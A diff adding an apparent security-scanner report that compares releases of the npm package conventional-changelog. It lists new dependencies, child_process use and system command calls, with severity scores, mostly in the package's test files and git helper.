@@ -1,0 +1,3226 @@
+Comparing conventional-changelog-0.0.1 to conventional-changelog-0.0.2:
+---------------------------------------------------------
+
+
+Severity sum:
+=> All queries: 0
+=> Distinct queries: 0
+
+
+Comparing conventional-changelog-0.0.2 to conventional-changelog-0.0.3:
+---------------------------------------------------------
+
+
+Severity sum:
+=> All queries: 0
+=> Distinct queries: 0
+
+
+Comparing conventional-changelog-0.0.3 to conventional-changelog-0.0.4:
+---------------------------------------------------------
+
+
+Severity sum:
+=> All queries: 0
+=> Distinct queries: 0
+
+
+Comparing conventional-changelog-0.0.4 to conventional-changelog-0.0.5:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: lodash.assign-2.4.1
+		File(s):
+			package/package.json
+				Location(s):
+					34:22
+	1 new occurence(s) of finding: Found dependency: event-stream-3.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					35:21
+
+js/data-flow-to-process (severity: 4.0):
+	1 new occurence(s) of finding: Data flow from string ([git log --grep="%s" -E --format=%s %s](1)) to system command execution / process ([cmd](2)).
+Data flow from string ([..](3)) to system command execution / process ([cmd](2)).
+Data flow from string ([](4)) to system command execution / process ([cmd](2)).
+		File(s):
+			package/lib/git.js
+				Location(s):
+					50:27
+
+js/require-child-process (severity: 3.0):
+	1 new occurence(s) of finding: Require of child_process module in file "git.js"
+		File(s):
+			package/lib/git.js
+				Location(s):
+					2:10
+
+js/system-command-execution (severity: 2.0):
+	1 new occurence(s) of finding: Detected SystemCommandExecution (cp.exec("git tag"))
+		File(s):
+			package/lib/git.js
+				Location(s):
+					15:19
+	1 new occurence(s) of finding: Detected SystemCommandExecution (cp.exec ... il -1'))
+		File(s):
+			package/lib/git.js
+				Location(s):
+					20:16
+	1 new occurence(s) of finding: Detected SystemCommandExecution (cp.exec(cmd))
+		File(s):
+			package/lib/git.js
+				Location(s):
+					50:19
+
+
+Severity sum:
+=> All queries: 13.0
+=> Distinct queries: 9.0
+
+
+Comparing conventional-changelog-0.0.5 to conventional-changelog-0.0.6:
+---------------------------------------------------------
+
+js/system-command-execution (severity: 2.0):
+	2 new occurence(s) of finding: Detected SystemCommandExecution (cp.exec ...  }}\n  }}))
+		File(s):
+			package/lib/git.js
+				Location(s):
+					14:3
+					25:3
+
+
+Severity sum:
+=> All queries: 4.0
+=> Distinct queries: 2.0
+
+
+Comparing conventional-changelog-0.0.6 to conventional-changelog-0.0.7:
+---------------------------------------------------------
+
+
+Severity sum:
+=> All queries: 0
+=> Distinct queries: 0
+
+
+Comparing conventional-changelog-0.0.7 to conventional-changelog-0.0.8:
+---------------------------------------------------------
+
+
+Severity sum:
+=> All queries: 0
+=> Distinct queries: 0
+
+
+Comparing conventional-changelog-0.0.8 to conventional-changelog-0.0.9:
+---------------------------------------------------------
+
+
+Severity sum:
+=> All queries: 0
+=> Distinct queries: 0
+
+
+Comparing conventional-changelog-0.0.9 to conventional-changelog-0.0.10:
+---------------------------------------------------------
+
+js/data-flow-to-process (severity: 4.0):
+	1 new occurence(s) of finding: Data flow from string ([git log --grep="%s" -E --format=%s %s](1)) to system command execution / process ([cmd](2)).
+Data flow from string (["](3)) to system command execution / process ([cmd](2)).
+Data flow from string ([..](4)) to system command execution / process ([cmd](2)).
+Data flow from string (["](5)) to system command execution / process ([cmd](2)).
+Data flow from string ([](6)) to system command execution / process ([cmd](2)).
+		File(s):
+			package/lib/git.js
+				Location(s):
+					55:27
+
+
+Severity sum:
+=> All queries: 4.0
+=> Distinct queries: 4.0
+
+
+Comparing conventional-changelog-0.0.10 to conventional-changelog-0.0.11:
+---------------------------------------------------------
+
+
+Severity sum:
+=> All queries: 0
+=> Distinct queries: 0
+
+
+Comparing conventional-changelog-0.0.11 to conventional-changelog-0.0.12:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: dateformat-1.0.11
+		File(s):
+			package/package.json
+				Location(s):
+					35:19
+	1 new occurence(s) of finding: Found dependency: event-stream-3.1.7
+		File(s):
+			package/package.json
+				Location(s):
+					36:21
+	1 new occurence(s) of finding: Found dependency: github-url-from-git-1.4.0
+		File(s):
+			package/package.json
+				Location(s):
+					37:28
+	1 new occurence(s) of finding: Found dependency: lodash.partial-3.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					39:23
+	1 new occurence(s) of finding: Found dependency: lodash.template-3.3.0
+		File(s):
+			package/package.json
+				Location(s):
+					40:24
+	1 new occurence(s) of finding: Found dependency: normalize-package-data-1.0.3
+		File(s):
+			package/package.json
+				Location(s):
+					41:31
+	1 new occurence(s) of finding: Found dependency: chai-2.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					44:13
+	1 new occurence(s) of finding: Found dependency: jshint-2.6.0
+		File(s):
+			package/package.json
+				Location(s):
+					45:15
+	1 new occurence(s) of finding: Found dependency: mocha-unknown
+		File(s):
+			package/package.json
+				Location(s):
+					46:14
+	1 new occurence(s) of finding: Found dependency: shelljs-0.3.0
+		File(s):
+			package/package.json
+				Location(s):
+					47:16
+	1 new occurence(s) of finding: Found dependency: sinon-1.12.2
+		File(s):
+			package/package.json
+				Location(s):
+					48:14
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-0.0.12 to conventional-changelog-0.0.13:
+---------------------------------------------------------
+
+
+Severity sum:
+=> All queries: 0
+=> Distinct queries: 0
+
+
+Comparing conventional-changelog-0.0.13 to conventional-changelog-0.0.14:
+---------------------------------------------------------
+
+
+Severity sum:
+=> All queries: 0
+=> Distinct queries: 0
+
+
+Comparing conventional-changelog-0.0.14 to conventional-changelog-0.0.15:
+---------------------------------------------------------
+
+
+Severity sum:
+=> All queries: 0
+=> Distinct queries: 0
+
+
+Comparing conventional-changelog-0.0.15 to conventional-changelog-0.0.16:
+---------------------------------------------------------
+
+
+Severity sum:
+=> All queries: 0
+=> Distinct queries: 0
+
+
+Comparing conventional-changelog-0.0.16 to conventional-changelog-0.0.17:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: event-stream-3.3.0
+		File(s):
+			package/package.json
+				Location(s):
+					37:21
+	1 new occurence(s) of finding: Found dependency: lodash-3.6.0
+		File(s):
+			package/package.json
+				Location(s):
+					39:15
+	1 new occurence(s) of finding: Found dependency: chai-2.2.0
+		File(s):
+			package/package.json
+				Location(s):
+					43:13
+	1 new occurence(s) of finding: Found dependency: coveralls-2.11.2
+		File(s):
+			package/package.json
+				Location(s):
+					44:18
+	1 new occurence(s) of finding: Found dependency: istanbul-0.3.13
+		File(s):
+			package/package.json
+				Location(s):
+					45:17
+	1 new occurence(s) of finding: Found dependency: jshint-2.6.3
+		File(s):
+			package/package.json
+				Location(s):
+					46:15
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-0.0.17 to conventional-changelog-0.1.0-alpha.1:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: add-stream-1.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					28:19
+	1 new occurence(s) of finding: Found dependency: compare-func-1.2.0
+		File(s):
+			package/package.json
+				Location(s):
+					29:21
+	1 new occurence(s) of finding: Found dependency: conventional-commits-parser-0.0.17
+		File(s):
+			package/package.json
+				Location(s):
+					30:36
+	1 new occurence(s) of finding: Found dependency: conventional-commits-writer-0.0.14
+		File(s):
+			package/package.json
+				Location(s):
+					31:36
+	1 new occurence(s) of finding: Found dependency: get-pkg-repo-0.0.6
+		File(s):
+			package/package.json
+				Location(s):
+					33:21
+	1 new occurence(s) of finding: Found dependency: git-latest-semver-tag-0.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					34:30
+	1 new occurence(s) of finding: Found dependency: git-raw-commits-0.0.7
+		File(s):
+			package/package.json
+				Location(s):
+					35:24
+	1 new occurence(s) of finding: Found dependency: lodash-3.9.3
+		File(s):
+			package/package.json
+				Location(s):
+					36:15
+	1 new occurence(s) of finding: Found dependency: meow-3.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					37:13
+	1 new occurence(s) of finding: Found dependency: q-1.4.1
+		File(s):
+			package/package.json
+				Location(s):
+					38:10
+	1 new occurence(s) of finding: Found dependency: semver-4.3.6
+		File(s):
+			package/package.json
+				Location(s):
+					39:15
+	1 new occurence(s) of finding: Found dependency: tempfile-1.1.1
+		File(s):
+			package/package.json
+				Location(s):
+					40:17
+	1 new occurence(s) of finding: Found dependency: through2-2.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					41:17
+	1 new occurence(s) of finding: Found dependency: chai-3.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					44:13
+	1 new occurence(s) of finding: Found dependency: concat-stream-1.4.10
+		File(s):
+			package/package.json
+				Location(s):
+					45:22
+	1 new occurence(s) of finding: Found dependency: istanbul-0.3.15
+		File(s):
+			package/package.json
+				Location(s):
+					47:17
+	1 new occurence(s) of finding: Found dependency: jscs-1.13.1
+		File(s):
+			package/package.json
+				Location(s):
+					48:13
+	1 new occurence(s) of finding: Found dependency: jshint-2.8.0
+		File(s):
+			package/package.json
+				Location(s):
+					49:15
+	1 new occurence(s) of finding: Found dependency: shelljs-0.5.1
+		File(s):
+			package/package.json
+				Location(s):
+					51:16
+
+js/data-flow-to-process (severity: 4.0):
+	14 new occurence(s) of finding: Data flow from string ([/../cli.js](1)) to system command execution / process ([cliPath](2)).
+		File(s):
+			package/test/cli.js
+				Location(s):
+					30:20
+					43:20
+					58:20
+					73:20
+					89:20
+					103:20
+					117:20
+					131:20
+					144:20
+					157:20
+					173:20
+					189:20
+					206:20
+					223:20
+
+js/require-child-process (severity: 3.0):
+	1 new occurence(s) of finding: Require of child_process module in file "angular.js"
+		File(s):
+			package/test/angular.js
+				Location(s):
+					2:13
+	1 new occurence(s) of finding: Require of child_process module in file "cli.js"
+		File(s):
+			package/test/cli.js
+				Location(s):
+					5:13
+
+js/system-command-execution (severity: 2.0):
+	4 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ...  init'))
+		File(s):
+			package/test/jquery.js
+				Location(s):
+					12:7
+			package/test/angular.js
+				Location(s):
+					13:7
+			package/test/test.js
+				Location(s):
+					11:5
+			package/test/cli.js
+				Location(s):
+					19:5
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... able"'))
+		File(s):
+			package/test/jquery.js
+				Location(s):
+					14:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... tion"'))
+		File(s):
+			package/test/jquery.js
+				Location(s):
+					16:7
+	2 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... thod"'))
+		File(s):
+			package/test/jquery.js
+				Location(s):
+					18:7
+					20:7
+	5 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... mmit"'))
+		File(s):
+			package/test/jquery.js
+				Location(s):
+					22:7
+			package/test/angular.js
+				Location(s):
+					15:7
+			package/test/test.js
+				Location(s):
+					13:5
+					31:5
+			package/test/cli.js
+				Location(s):
+					21:5
+	1 new occurence(s) of finding: Detected SystemCommandExecution (child.e ...      }}))
+		File(s):
+			package/test/angular.js
+				Location(s):
+					18:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ...  bug"'))
+		File(s):
+			package/test/angular.js
+				Location(s):
+					20:9
+	2 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... ster"'))
+		File(s):
+			package/test/angular.js
+				Location(s):
+					22:9
+					24:9
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... 1.0.0'))
+		File(s):
+			package/test/angular.js
+				Location(s):
+					64:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... ures"'))
+		File(s):
+			package/test/angular.js
+				Location(s):
+					66:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... s #1"'))
+		File(s):
+			package/test/test.js
+				Location(s):
+					33:5
+	14 new occurence(s) of finding: Detected SystemCommandExecution (spawn(c ... \n    }}))
+		File(s):
+			package/test/cli.js
+				Location(s):
+					30:14
+					43:14
+					58:14
+					73:14
+					89:14
+					103:14
+					117:14
+					131:14
+					144:14
+					157:14
+					173:14
+					189:14
+					206:14
+					223:14
+
+
+Severity sum:
+=> All queries: 130.0
+=> Distinct queries: 9.0
+
+
+Comparing conventional-changelog-0.1.0-alpha.1 to conventional-changelog-0.1.0-alpha.2:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: compare-func-1.3.1
+		File(s):
+			package/package.json
+				Location(s):
+					29:21
+	1 new occurence(s) of finding: Found dependency: git-raw-commits-0.0.8
+		File(s):
+			package/package.json
+				Location(s):
+					35:24
+	1 new occurence(s) of finding: Found dependency: meow-3.3.0
+		File(s):
+			package/package.json
+				Location(s):
+					37:13
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-0.1.0-alpha.2 to conventional-changelog-0.1.0-alpha.3:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-writer-0.0.16
+		File(s):
+			package/package.json
+				Location(s):
+					30:38
+	1 new occurence(s) of finding: Found dependency: conventional-commits-parser-0.0.18
+		File(s):
+			package/package.json
+				Location(s):
+					31:36
+
+js/system-command-execution (severity: 2.0):
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ...  init'))
+		File(s):
+			package/test/jshint.js
+				Location(s):
+					12:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... mmit"'))
+		File(s):
+			package/test/jshint.js
+				Location(s):
+					22:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... file"'))
+		File(s):
+			package/test/jshint.js
+				Location(s):
+					14:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... #985"'))
+		File(s):
+			package/test/jshint.js
+				Location(s):
+					16:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... only"'))
+		File(s):
+			package/test/jshint.js
+				Location(s):
+					18:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... mode"'))
+		File(s):
+			package/test/jshint.js
+				Location(s):
+					20:7
+
+
+Severity sum:
+=> All queries: 12.0
+=> Distinct queries: 2.0
+
+
+Comparing conventional-changelog-0.1.0-alpha.3 to conventional-changelog-0.1.0-beta.1:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-writer-0.0.17
+		File(s):
+			package/package.json
+				Location(s):
+					30:38
+	1 new occurence(s) of finding: Found dependency: conventional-commits-parser-0.0.19
+		File(s):
+			package/package.json
+				Location(s):
+					31:36
+	1 new occurence(s) of finding: Found dependency: semver-5.0.1
+		File(s):
+			package/package.json
+				Location(s):
+					39:15
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-0.1.0-beta.1 to conventional-changelog-0.1.0-beta.2:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: get-pkg-repo-0.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					33:21
+
+js/system-command-execution (severity: 2.0):
+	2 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ...  init'))
+		File(s):
+			package/test/atom.js
+				Location(s):
+					12:7
+			package/test/eslint.js
+				Location(s):
+					12:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... ting"'))
+		File(s):
+			package/test/atom.js
+				Location(s):
+					14:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... ges\''))
+		File(s):
+			package/test/atom.js
+				Location(s):
+					16:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... 6.17"'))
+		File(s):
+			package/test/atom.js
+				Location(s):
+					18:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... 79.0"'))
+		File(s):
+			package/test/atom.js
+				Location(s):
+					20:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... 18)\''))
+		File(s):
+			package/test/eslint.js
+				Location(s):
+					14:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... .0.1"'))
+		File(s):
+			package/test/atom.js
+				Location(s):
+					22:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... tion"'))
+		File(s):
+			package/test/eslint.js
+				Location(s):
+					20:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... 005)"'))
+		File(s):
+			package/test/eslint.js
+				Location(s):
+					16:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... 000)"'))
+		File(s):
+			package/test/eslint.js
+				Location(s):
+					18:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... h-3 "'))
+		File(s):
+			package/test/eslint.js
+				Location(s):
+					22:7
+
+
+Severity sum:
+=> All queries: 24.0
+=> Distinct queries: 2.0
+
+
+Comparing conventional-changelog-0.1.0-beta.2 to conventional-changelog-0.1.0-beta.3:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-writer-0.0.18
+		File(s):
+			package/package.json
+				Location(s):
+					30:38
+
+js/data-flow-to-process (severity: 4.0):
+	1 new occurence(s) of finding: Data flow from string ([/../cli.js](1)) to system command execution / process ([cliPath](2)).
+		File(s):
+			package/test/cli.js
+
+js/system-command-execution (severity: 2.0):
+	1 new occurence(s) of finding: Detected SystemCommandExecution (spawn(c ... \n    }}))
+		File(s):
+			package/test/cli.js
+
+
+Severity sum:
+=> All queries: 6.0
+=> Distinct queries: 6.0
+
+
+Comparing conventional-changelog-0.1.0-beta.3 to conventional-changelog-0.1.0:
+---------------------------------------------------------
+
+
+Severity sum:
+=> All queries: 0
+=> Distinct queries: 0
+
+
+Comparing conventional-changelog-0.1.0 to conventional-changelog-0.1.1:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: git-raw-commits-0.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					35:24
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-0.1.1 to conventional-changelog-0.1.2:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: git-latest-semver-tag-1.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					34:30
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-0.1.2 to conventional-changelog-0.1.3:
+---------------------------------------------------------
+
+js/system-command-execution (severity: 2.0):
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... ures"'))
+		File(s):
+			package/test/angular.js
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... 2.0.0'))
+		File(s):
+			package/test/angular.js
+				Location(s):
+					117:7
+
+
+Severity sum:
+=> All queries: 4.0
+=> Distinct queries: 2.0
+
+
+Comparing conventional-changelog-0.1.3 to conventional-changelog-0.2.0:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-writer-0.2.0
+		File(s):
+			package/package.json
+				Location(s):
+					30:38
+	1 new occurence(s) of finding: Found dependency: git-semver-tags-1.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					35:24
+
+js/system-command-execution (severity: 2.0):
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... 0.1.0'))
+		File(s):
+			package/test/test.js
+				Location(s):
+					30:5
+
+
+Severity sum:
+=> All queries: 2.0
+=> Distinct queries: 2.0
+
+
+Comparing conventional-changelog-0.2.0 to conventional-changelog-0.2.1:
+---------------------------------------------------------
+
+js/system-command-execution (severity: 2.0):
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... est8"'))
+		File(s):
+			package/test/test.js
+				Location(s):
+					378:5
+
+
+Severity sum:
+=> All queries: 2.0
+=> Distinct queries: 2.0
+
+
+Comparing conventional-changelog-0.2.1 to conventional-changelog-0.3.0:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-writer-0.3.0
+		File(s):
+			package/package.json
+				Location(s):
+					30:38
+	1 new occurence(s) of finding: Found dependency: conventional-commits-parser-0.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					31:36
+	1 new occurence(s) of finding: Found dependency: git-raw-commits-0.1.1
+		File(s):
+			package/package.json
+				Location(s):
+					34:24
+	1 new occurence(s) of finding: Found dependency: git-tails-1.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					47:18
+	1 new occurence(s) of finding: Found dependency: jscs-2.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					49:13
+
+js/data-flow-to-process (severity: 4.0):
+	1 new occurence(s) of finding: Data flow from string ([git tag v0.0.1](1)) to system command execution / process (['git ta ...  + tail](2)).
+		File(s):
+			package/test/test.js
+				Location(s):
+					404:18
+
+js/require-child-process (severity: 3.0):
+	1 new occurence(s) of finding: Require of child_process module in file "express.js"
+		File(s):
+			package/test/express.js
+				Location(s):
+					2:13
+	1 new occurence(s) of finding: Require of child_process module in file "ember.js"
+		File(s):
+			package/test/ember.js
+				Location(s):
+					2:13
+
+js/system-command-execution (severity: 2.0):
+	3 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ...  init'))
+		File(s):
+			package/test/express.js
+				Location(s):
+					13:7
+			package/test/jscs.js
+				Location(s):
+					12:7
+			package/test/ember.js
+				Location(s):
+					13:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... tion"'))
+		File(s):
+			package/test/jscs.js
+				Location(s):
+					16:7
+	10 new occurence(s) of finding: Detected SystemCommandExecution (child.e ...      }}))
+		File(s):
+			package/test/express.js
+				Location(s):
+					15:7
+					17:9
+					21:11
+			package/test/ember.js
+				Location(s):
+					15:7
+					17:9
+					19:11
+					21:13
+					23:15
+					25:17
+					27:19
+	3 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... mmit"'))
+		File(s):
+			package/test/express.js
+				Location(s):
+					23:13
+			package/test/jscs.js
+				Location(s):
+					22:7
+			package/test/ember.js
+				Location(s):
+					29:21
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... ords"'))
+		File(s):
+			package/test/jscs.js
+				Location(s):
+					14:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... ents"'))
+		File(s):
+			package/test/express.js
+				Location(s):
+					19:11
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... eset"'))
+		File(s):
+			package/test/jscs.js
+				Location(s):
+					18:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... sets"'))
+		File(s):
+			package/test/jscs.js
+				Location(s):
+					20:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... info"'))
+		File(s):
+			package/test/ember.js
+				Location(s):
+					31:21
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... 0.1.0'))
+		File(s):
+			package/test/test.js
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... + tail))
+		File(s):
+			package/test/test.js
+				Location(s):
+					404:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... est8"'))
+		File(s):
+			package/test/test.js
+
+
+Severity sum:
+=> All queries: 60.0
+=> Distinct queries: 9.0
+
+
+Comparing conventional-changelog-0.3.0 to conventional-changelog-0.3.2:
+---------------------------------------------------------
+
+js/data-flow-to-process (severity: 4.0):
+	2 new occurence(s) of finding: Data flow from string ([/../cli.js](1)) to system command execution / process ([cliPath](2)).
+		File(s):
+			package/test/cli.js
+
+js/system-command-execution (severity: 2.0):
+	2 new occurence(s) of finding: Detected SystemCommandExecution (spawn(c ... \n    }}))
+		File(s):
+			package/test/cli.js
+
+
+Severity sum:
+=> All queries: 12.0
+=> Distinct queries: 6.0
+
+
+Comparing conventional-changelog-0.3.2 to conventional-changelog-0.4.0:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-writer-0.3.2
+		File(s):
+			package/package.json
+				Location(s):
+					30:38
+	1 new occurence(s) of finding: Found dependency: git-raw-commits-0.1.2
+		File(s):
+			package/package.json
+				Location(s):
+					34:24
+
+js/system-command-execution (severity: 2.0):
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ...  init'))
+		File(s):
+			package/test/codemirror.js
+				Location(s):
+					12:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... bles"'))
+		File(s):
+			package/test/codemirror.js
+				Location(s):
+					14:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... 6f1 "'))
+		File(s):
+			package/test/codemirror.js
+				Location(s):
+					16:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... tion"'))
+		File(s):
+			package/test/codemirror.js
+				Location(s):
+					18:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... $var"'))
+		File(s):
+			package/test/codemirror.js
+				Location(s):
+					20:7
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... mmit"'))
+		File(s):
+			package/test/codemirror.js
+				Location(s):
+					22:7
+
+
+Severity sum:
+=> All queries: 12.0
+=> Distinct queries: 2.0
+
+
+Comparing conventional-changelog-0.4.0 to conventional-changelog-0.4.1:
+---------------------------------------------------------
+
+
+Severity sum:
+=> All queries: 0
+=> Distinct queries: 0
+
+
+Comparing conventional-changelog-0.4.1 to conventional-changelog-0.4.2:
+---------------------------------------------------------
+
+js/require-child-process (severity: 3.0):
+	1 new occurence(s) of finding: Require of child_process module in file "jshint.js"
+		File(s):
+			package/test/jshint.js
+				Location(s):
+					2:13
+
+js/system-command-execution (severity: 2.0):
+	1 new occurence(s) of finding: Detected SystemCommandExecution (child.e ...      }}))
+		File(s):
+			package/test/jshint.js
+				Location(s):
+					21:7
+
+
+Severity sum:
+=> All queries: 5.0
+=> Distinct queries: 5.0
+
+
+Comparing conventional-changelog-0.4.2 to conventional-changelog-0.4.3:
+---------------------------------------------------------
+
+js/data-flow-to-process (severity: 4.0):
+	2 new occurence(s) of finding: Data flow from string ([/../cli.js](1)) to system command execution / process ([cliPath](2)).
+		File(s):
+			package/test/cli.js
+
+js/system-command-execution (severity: 2.0):
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... oops"'))
+		File(s):
+			package/test/angular.js
+				Location(s):
+					26:9
+	2 new occurence(s) of finding: Detected SystemCommandExecution (spawn(c ... \n    }}))
+		File(s):
+			package/test/cli.js
+
+
+Severity sum:
+=> All queries: 14.0
+=> Distinct queries: 6.0
+
+
+Comparing conventional-changelog-0.4.3 to conventional-changelog-0.5.0:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-writer-0.4.1
+		File(s):
+			package/package.json
+				Location(s):
+					30:38
+	1 new occurence(s) of finding: Found dependency: read-pkg-1.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					39:17
+	1 new occurence(s) of finding: Found dependency: read-pkg-up-1.0.1
+		File(s):
+			package/package.json
+				Location(s):
+					40:20
+
+js/system-command-execution (severity: 2.0):
+	11 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... lates'))
+		File(s):
+			package/test/codemirror.js
+				Location(s):
+					12:7
+			package/test/atom.js
+				Location(s):
+					12:7
+			package/test/jscs.js
+				Location(s):
+					12:7
+			package/test/express.js
+				Location(s):
+					13:7
+			package/test/jquery.js
+				Location(s):
+					12:7
+			package/test/ember.js
+				Location(s):
+					13:7
+			package/test/eslint.js
+				Location(s):
+					12:7
+			package/test/jshint.js
+				Location(s):
+					13:7
+			package/test/angular.js
+				Location(s):
+					13:7
+			package/test/cli.js
+				Location(s):
+					19:5
+			package/test/test.js
+				Location(s):
+					12:5
+	1 new occurence(s) of finding: Detected SystemCommandExecution (child.e ...      }}))
+		File(s):
+			package/test/angular.js
+
+
+Severity sum:
+=> All queries: 24.0
+=> Distinct queries: 2.0
+
+
+Comparing conventional-changelog-0.5.0 to conventional-changelog-0.5.1:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: istanbul-0.4.0
+		File(s):
+			package/package.json
+				Location(s):
+					50:17
+
+js/system-command-execution (severity: 2.0):
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... ase!"'))
+		File(s):
+			package/test/test.js
+				Location(s):
+					749:5
+
+
+Severity sum:
+=> All queries: 2.0
+=> Distinct queries: 2.0
+
+
+Comparing conventional-changelog-0.5.1 to conventional-changelog-0.5.2:
+---------------------------------------------------------
+
+js/system-command-execution (severity: 2.0):
+	1 new occurence(s) of finding: Detected SystemCommandExecution (shell.e ... case"'))
+		File(s):
+			package/test/jshint.js
+				Location(s):
+					20:7
+
+
+Severity sum:
+=> All queries: 2.0
+=> Distinct queries: 2.0
+
+
+Comparing conventional-changelog-0.5.2 to conventional-changelog-0.5.3:
+---------------------------------------------------------
+
+
+Severity sum:
+=> All queries: 0
+=> Distinct queries: 0
+
+
+Comparing conventional-changelog-0.5.3 to conventional-changelog-1.0.0:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-0.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					28:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-0.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					29:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-0.1.0
+		File(s):
